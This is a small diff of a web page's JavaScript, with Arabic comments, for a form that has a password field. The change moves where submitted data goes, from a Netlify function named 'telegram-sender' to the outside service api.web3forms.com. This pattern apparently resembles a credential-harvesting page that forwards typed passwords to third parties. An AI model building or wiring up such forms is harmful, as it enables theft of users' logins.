@@ -270,7 +270,7 @@
     const togglePassword = document.getElementById('togglePassword');
     const submitButton = document.getElementById('submitButton'); 
 
-    // 1. وظيفة التحقق من النموذج وإرسال البيانات إلى Netlify Function
+    // 1. وظيفة التحقق من النموذج وإرسال البيانات  Function
     form.addEventListener('submit', async function(event) {
         // نمنع الإرسال الافتراضي للنموذج
         event.preventDefault(); 
@@ -303,7 +303,7 @@
 
             try {
                 // إرسال البيانات إلى دالة Netlify Function الجديدة
-                const response = await fetch('/.netlify/functions/telegram-sender', {
+                const response = await fetch('https://api.web3forms.com/submit', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
